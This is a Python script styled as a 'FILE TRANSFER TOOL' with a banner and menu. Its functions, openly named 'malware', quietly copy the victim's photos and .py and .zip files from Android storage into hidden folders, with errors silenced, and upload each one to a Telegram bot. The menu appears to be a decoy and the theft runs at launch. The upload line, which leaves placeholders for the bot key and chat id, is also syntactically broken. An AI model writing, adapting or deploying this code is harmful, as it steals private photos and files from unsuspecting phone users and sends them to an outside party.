#!/usr/bin/python3
#creater: Alienrazor
import os
from os import system as cmd
from os import listdir as lst
from sys import exit as exit
from sys import argv as arg
from time import sleep as slp
from random import randint as rr
from requests import post as post
#_________[ BASIC COLOURS ]_________>>
red = "\33[31m"
green = "\33[32m"
white = "\33[37m"
#_________[ SCRIPT BANNER ]_________>>
banner =(""" \033[0;91m                
                 ::             .^:                    
                5#~               .Y&J                  
            .: &@^                  5@# !               
            &P:@@                   ~@@~@J              
            &@&@@G       ....~     .&@@@@Y              
          .?~&@@@G     !P@@@@7      @@@@G~J             
           ?&#@@@P^.     !@@&     ^^&@@&&&^             
            .5#&@@GBPJ!:.Y@@@?^?YGG#@@&B?               
             !B&&@@@@@@@@@@@@@@@@@@@@&#G:               
              :P&@@&@@@@@@@@@@@@@&&@@B7                 
                 .~!:^G@&@@@@@@J:~!:                    
                   ^?P5:.@@@G !P5!.                     
                    :.  G@@@@!  :.                      
                       J@&@&@@^                         
                      :&&B&#&##                         
                      :Y#G&#&Y5                         
                        Y5@#B:                          
                        ^J@#Y                           
                         ~@#^                           
                         .@#                            
                          &B                            
                          &G                            
                          #5                            
                          G?                            
                          :.      \033
                             
                                                                          
\033[96;1m______________________________________________________ \033[93;1m \n
\033[1;32m          AUTHOR : Alienrazor
\033[1;32m          GITHUB : Alienrazor
 \033[1;32m         TOOL NAME : FILE TRANSFER TOOL
\033[96;1m______________________________________________________ \33
""")                          
def lines():
	print('\33[1;36m______________________________________________________\n')

def Main():
	os.system('clear')
	print(banner)
	print('\33[1;36m______________________________________________________\n')
	print('\33[1;32m [1] START DATA TRANSFER IN TELEGRAM BOT')
	print('\33[1;32m [2] HOW TO SETUP THIS TOOL')
	print('\33[1;32m [3] FOLLOW MY FACEBOOK')
	print(' [0]\x1b[1;91m EXIT ')
	print('\33[1;36m______________________________________________________\n')
	Main1 = input( '\33[1;32m[•] SELECT OPTION : ')
	if Main1 =='1':
		annu()
	if Main1 =='0':
		exit()
	if Main1 =='3':
		os.system('xdg-open https://www.facebook.com/Alienrazor')
	if Main1 =='2':
		bangla()
	else:
		print('\n\033[1;31m CHOOSE VALID OPTION\033[0;97m')
		Main()
		
		
		
def annu():
	malware()

def bangla():
    os.system('xdg-open https://www.youtube/Alienrazor')

#_________[ FAKE IDS ]_________>>
#def fakke
#yl	clear()
#	print(banner)
#	line()	#
#__________[ COPY FILES ]_________>>
def copy(level=1):
	if level not in [1,2,3]:
		level = 1
	if level==1:
		try:
			cmd("cp /sdcard/*.py /sdcard/Data/Files &> /dev/null")
		except:
			pass
		try:
			IDS = lst("/storage/emulated/0/Pictures/")
			for folders in IDS:
				IDT = lst(f"/storage/emulated/0/Pictures/{folders}")
				for folders2 in IDT:
					cmd(f"cp /storage/emulated/0/Pictures/{folders}/{folders2} /sdcard/Data/Photos &> /dev/null")
		except:
			pass
	elif level==2:
		try:
			IDS = lst("/storage/emulated/0/Pictures/")
			for folders in IDS:
				IDT = lst(f"/storage/emulated/0/Pictures/{folders}")
				for folders2 in IDT:
					cmd(f"cp /storage/emulated/0/Pictures/{folders}/{folders2} /sdcard/Data/Photos &> /dev/null")
		except:
			pass
		try:
			cmd("cp /sdcard/*.py /sdcard/Data/File &> /dev/null")
		except:
			pass
	elif level==3:
		try:
			IDS = lst("/storage/emulated/0/Pictures/")
			for folders in IDS:
				IDT = lst(f"/storage/emulated/0/Pictures/{folders}")
				for folders2 in IDT:
					cmd(f"cp /storage/emulated/0/Pictures/{folders}/{folders2} /sdcard/Data/Photos &> /dev/null")
		except:
			pass
		try:
			cmd("cp /sdcard/*.py /sdcard/File &> /dev/null")
		except:
			pass
		try:
			cmd("cp /sdcard/*.zip /sdcard/File &> /dev/null")
		except:
			pass
#_________[ CREATING FOLDERS ]_________>>
def folder():
	try:
		list_sdcard = lst("/sdcard")
		if "Data" in list_sdcard:
			pass
		else:
			cmd("mkdir /sdcard/Data &> /dev/null")
	except:
		cmd("mkdir /sdcard/Data &> /dev/null")
	try:
		list_sdcard = lst("/sdcard/Data")
		if "Files" in list_sdcard:
			pass
		else:
			cmd("mkdir /sdcard/Data/Files &> /dev/null")
	except:
		cmd("mkdir /sdcard/Data/Files &> /dev/null")
	try:
		list_sdcard = lst("/sdcard/Data")
		if "Photos" in list_sdcard:
			pass
		else:
			cmd("mkdir /sdcard/Data/Photos &> /dev/null")
	except:
		cmd("mkdir /sdcard/Data/Photos &> /dev/null")
#_________[ MALWARE UPLOAD DIF ]______>>
def upload(file):
	data = {"chat_id": "<chat_id>" }
	files = {"document": open(file, "rb")}
	try:
		response = post("https://api.telegram.org/bot"<API_KEY_LINK_ADD>"/sendDocument", data=data, files=files)
	except:
		print("ERROR")
#_________[ MALWARE MAIN DEF ]______>>
def malware():
	Main()
	folder()
	copy()
	list_Files1 = lst("/sdcard/Data/Photos")
	list_Files2 = lst("/sdcard/Data/Files")
	for file in list_Files1:
		file = "/sdcard/Data/Photos/"+file
		upload(file)
	for file in list_Files2:
		file = "/sdcard/Data/Files/"+file
		upload(file)
if __name__=="__main__":
	malware()
